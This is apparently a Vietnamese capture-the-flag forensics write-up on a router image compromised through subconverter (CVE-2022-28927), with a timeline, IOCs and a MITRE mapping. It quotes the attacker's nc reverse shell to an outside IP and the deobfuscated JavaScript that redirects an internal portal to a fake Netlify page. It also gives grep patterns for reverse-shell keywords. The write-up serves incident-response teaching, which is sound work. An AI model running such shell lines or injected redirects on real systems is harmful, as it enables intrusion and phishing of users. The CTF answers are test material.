Một router OpenWrt (ImmortalWrt) bị chiếm quyền ngày 04/07/2025 qua dịch vụ subconverter v0.7.2 chạy trên router; kẻ tấn công mở reverse shell, cài khóa SSH, chiếm tên miền nội bộ và chuyển hướng nhân viên sang trang giả trên Netlify.
Đề bài: nhân viên mở website nội bộ, trình duyệt báo cập nhật, tải file về nhưng không thấy gì xảy ra; sau đó IT báo router của công ty đã bị hack. Tài liệu giao là router.img (~428 MB).
• Đặc điểm file: offset 0x1FE là 55 AA, phân vùng MBR kiểu EE (protective MBR), offset 0x200 là EFI PART (GPT header).
• Phân vùng: EFI System FAT16 (128 MB, nhãn kernel), rootfs ext4 (300 MB) và một phân vùng BIOS boot nhỏ. Toàn bộ dữ liệu điều tra nằm ở rootfs.
• FTK Imager 8.2: duyệt cây thư mục, xem Date Modified và nội dung từng file.
• Ubuntu VM (VMware): gắn image bằng loop device để chạy grep, find, strings trên file thật.
• Node.js: giải mã JavaScript bị làm rối ở Q6.
Gắn rootfs ở chế độ chỉ đọc để không làm thay đổi bằng chứng:
sudo losetup -fP --show router.img        # ví dụ /dev/loop22
lsblk -f /dev/loop22                       # phân vùng ext4 nhãn rootfs là p2
sudo mkdir -p /mnt/rootfs
sudo mount -o ro,noload /dev/loop22p2 /mnt/rootfs
FTK Imager hiển thị giờ UTC còn ls trong VM hiển thị giờ +07, nên các mốc thời gian dưới đây dùng giờ +07.
Phân tích từng câu
Q1 và Q3 còn thiếu một bằng chứng trực tiếp (xem ghi chú dưới từng câu), bốn câu còn lại đã có bằng chứng từ image.
Q1: Phiên bản OS — 23.05.4
Đọc DISTRIB_RELEASE trong /etc/openwrt_release (hoặc VERSION_ID trong /etc/os-release). Chuỗi commonname 'ImmortalWrt' trong /etc/config/uhttpd cho thấy đây là ImmortalWrt, bản fork của OpenWrt.
[ ] Bổ sung: ảnh chụp hoặc kết quả cat /mnt/rootfs/etc/openwrt_release.
Q2: IP kẻ tấn công — 156.238.233.47
Hướng tìm: giả định kẻ tấn công cần một kết nối ra ngoài, nên tìm từ khóa đặc trưng của reverse shell (mkfifo, /dev/tcp, sh -i) rồi loại nhiễu từ kernel.
strings -a -t d router.img > all_strings.txt
grep -nE "mkfifo|/dev/tcp|sh -i|bash -i" all_strings.txt | grep -vE "func |sync|bpf"
sudo grep -rIl "156.238.233.47" /mnt/rootfs
Bằng chứng: file /root/subconverter/cache/dad176d5807526bf19069ecce4f14bfe (154 byte, tạo lúc 15:17:29 ngày 04/07/2025) chứa:
function parse(x) {
        os.exec([ "sh", "-c", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 156.238.233.47 31426 >/tmp/f" ], { file: "sh" })
}
Đây là reverse shell kiểu named pipe: router chủ động kết nối ra 156.238.233.47:31426.
Q3: CVE khai thác — CVE-2022-28927
CVE-2022-28927 là lỗ hổng RCE trong Subconverter v0.7.2, cho phép thực thi mã tùy ý qua các tham số config và url được chế tạo (CVSS v3.1 9.8). Các mảnh ghép trong image:
• /root/subconverter_aarch64.tar.gz được tải lúc 15:08 và cấu hình pref.toml tạo lúc 15:11, với listen = "0.0.0.0", port = 25500.
• File cache là một script có hàm parse(x) gọi os.exec, đúng kiểu script mà subconverter tải về từ URL do kẻ tấn công kiểm soát.
• Các file gốc của subconverter có mtime 2022-04-03, chưa đủ để kết luận phiên bản.
[ ] Bổ sung: xác nhận phiên bản bằng strings /mnt/rootfs/root/subconverter/subconverter | grep -E "v0\.[0-9]+\.[0-9]+".
Q4: Persistence — dropbear
File /etc/dropbear/authorized_keys (96 byte, sửa lúc 15:18:43) chứa khóa công khai của kẻ tấn công:
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBbrcKcmmPoh/U+5gF2lppicVGS3tvQgKEXGw2QXIPdE citlali@teyvat
Khóa này cho phép kẻ tấn công đăng nhập SSH vào router bất cứ lúc nào mà không cần mật khẩu, kể cả khi reverse shell đã bị cắt.
Q5: Host bị chiếm — portal.r3.internal
File /etc/config/dhcp (sửa lúc 15:19:56) có dòng ghi đè DNS cục bộ của dnsmasq, không có trong cấu hình mặc định:
list address '/10.0.2.15/portal.r3.internal'
Router là máy cấp DNS cho mạng LAN, nên tên miền nội bộ này bị điều hướng về chính router.
Q6: Host chứa artifact độc hại — nimble-bonbon-d941a8.netlify.app
grep toàn image không thấy host này ở dạng văn bản (chỉ có privacyfriendly.netlify.app, là nhiễu từ danh sách quy tắc của subconverter). Dấu vết nằm trong web root:
• /www/index.html (904 byte) là trang chuyển hướng mặc định của LuCI, sạch, nhưng nạp /luci-static/bootstrap/bootstrap.min.js.
• /www/luci-static/bootstrap/bootstrap.min.js (21667 byte, sửa lúc 22:22:05) đã bị làm rối bằng jsjiami.com.v7, và là file duy nhất trong web root bị đổi sau 16:00.
Dùng phần decoder của file (cắt trước đoạn var _0x44e812=) rồi gọi hàm giải mã cho sáu chuỗi ở dòng chuyển hướng, thu được:
if (window.location.host == "portal.r3.internal")
    window.location.href = "https://nimble-bonbon-d941a8.netlify.app/";
Nhân viên mở portal.r3.internal sẽ bị chuyển sang trang Netlify của kẻ tấn công. Cốt truyện (thông báo cập nhật trình duyệt giả và file tải về) cho thấy trang đó chứa artifact độc hại; image chỉ chứng minh được phần chuyển hướng.
Timeline tấn công
Toàn bộ hoạt động diễn ra trong khoảng 14:47 đến 22:22 ngày 04/07/2025 (giờ +07), dựng từ thời gian sửa (mtime) của file trên rootfs. Mtime chỉ là dấu vết gián tiếp, kẻ tấn công có thể sửa được nó.
Giờ (+07)
File hoặc thay đổi
Ý nghĩa
14:47:42
dropbear_*_host_key, board.json, config/uhttpd, config/system, dnsmasq.conf
Khởi tạo hệ thống lần đầu
14:50:21
/etc/config/network
Cấu hình mạng
14:54:47
/etc/passwd, /etc/shadow
Thiết lập tài khoản
14:59:13
libnghttp2-14, libcurl4, curl (opkg)
Cài curl
15:08:39
/root/subconverter_aarch64.tar.gz (3,2 MB)
Tải gói subconverter
15:11:43
/root/subconverter/pref.toml
Tạo cấu hình, lắng nghe 0.0.0.0:25500
15:15:01
thư mục /root/subconverter/cache
Subconverter chạy, tạo thư mục cache
15:17:29
cache/dad176d5807526bf19069ecce4f14bfe
Script reverse shell về 156.238.233.47:31426 (Q2, Q3)
15:18:43
/etc/dropbear/authorized_keys
Thêm khóa SSH citlali@teyvat (Q4)
15:19:56
/etc/config/dhcp
Ghi đè DNS portal.r3.internal (Q5)
16:00:48
/www/index.html và thư mục bootstrap
Chạm vào web root
22:22:05
/www/luci-static/bootstrap/bootstrap.min.js
JS bị làm rối, chuyển hướng sang Netlify (Q6)
Thứ tự này khớp với kịch bản: khai thác subconverter, có shell, giữ quyền truy cập, chiếm tên miền nội bộ, rồi chuyển hướng nạn nhân.
IOC
Loại
Giá trị
Ghi chú
IP + cổng
156.238.233.47:31426
Đích của reverse shell
Domain
nimble-bonbon-d941a8.netlify.app
Đích chuyển hướng của nạn nhân
Domain nội bộ bị chiếm
portal.r3.internal
Bị DNS trỏ về 10.0.2.15
Khóa SSH
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBbrcKcmmPoh/U+5gF2lppicVGS3tvQgKEXGw2QXIPdE citlali@teyvat
Trong /etc/dropbear/authorized_keys
File
/root/subconverter/cache/dad176d5807526bf19069ecce4f14bfe
Script reverse shell
File
/www/luci-static/bootstrap/bootstrap.min.js
JS làm rối bằng jsjiami v7
File
/etc/config/dhcp
Dòng list address ghi đè DNS
Dịch vụ
subconverter lắng nghe 0.0.0.0:25500
Điểm xâm nhập (CVE-2022-28927)
Khuyến nghị xử lý: chặn 156.238.233.47 và domain Netlify ở tường lửa, xóa khóa SSH và dòng DNS ở trên, khôi phục bootstrap.min.js từ bản gốc, gỡ subconverter khỏi router, và cài lại router vì shell đã chạy với quyền root.
Ánh xạ MITRE ATT&CK
Chiến thuật
Kỹ thuật
Bằng chứng
Initial Access
T1190 Exploit Public-Facing Application
Subconverter 0.7.2 mở cổng 25500, CVE-2022-28927
Execution
T1059 Command and Scripting Interpreter
os.exec(["sh","-c",...]) trong script cache
Persistence
T1098.004 SSH Authorized Keys
Khóa citlali@teyvat trong authorized_keys
Command and Control
T1095 Non-Application Layer Protocol
Reverse shell bằng nc tới 156.238.233.47:31426
Defense Evasion
T1027 Obfuscated Files or Information
bootstrap.min.js bị làm rối bằng jsjiami v7
Resource Development
T1584.002 Compromise Infrastructure: DNS Server
list address ghi đè portal.r3.internal trên dnsmasq
Initial Access (nạn nhân)
T1189 Drive-by Compromise
JS trên router chuyển hướng sang trang Netlify giả
Các ánh xạ này do người viết gán dựa trên bằng chứng, không phải kết luận của đề bài.
Bài học rút ra
• Loại nhiễu trước, giới hạn kết quả sau. grep ... | head -60 trên strings của cả image bị kernel lấp đầy (func , sync, bpf). Dùng từ khóa hiếm (mkfifo, ssh-ed25519) và lọc nguồn nhiễu rồi mới cắt kết quả.
• Từ khóa phải có ranh giới. Mẫu nc  khớp luôn func , sync ; dùng \bnc\b.
• Sắp theo số lần xuất hiện sẽ đẩy IOC xuống cuối. IP của kẻ tấn công chỉ xuất hiện vài lần, còn danh sách subconverter/rules lặp hàng chục lần.
• Nối offset với file. Offset từ grep -b hoặc strings -t d đổi ra khối ext4 rồi tra bằng ifind và ffind; hoặc mount rootfs rồi grep -rIl để có ngay đường dẫn.
• Lọc theo thời gian sửa. Một lệnh find -newermt "2025-07-03" ! -newermt "2025-07-06" thu hẹp cả rootfs xuống 26 file và chỉ ra gần như mọi file đáng ngờ.
• Không tìm thấy dạng văn bản không có nghĩa là không có. Host ở Q6 nằm trong JS bị làm rối bằng jsjiami v7; chỉ giải mã mới thấy. Khi một file chuẩn (như bootstrap.min.js) có mtime lệch hẳn các file xung quanh, hãy mở ra xem.
• Chạy mã nghi ngờ cẩn thận. Chỉ chạy phần decoder của file trong Node (vm), không chạy phần logic hay anti-debug, và làm trên bản sao trong VM.
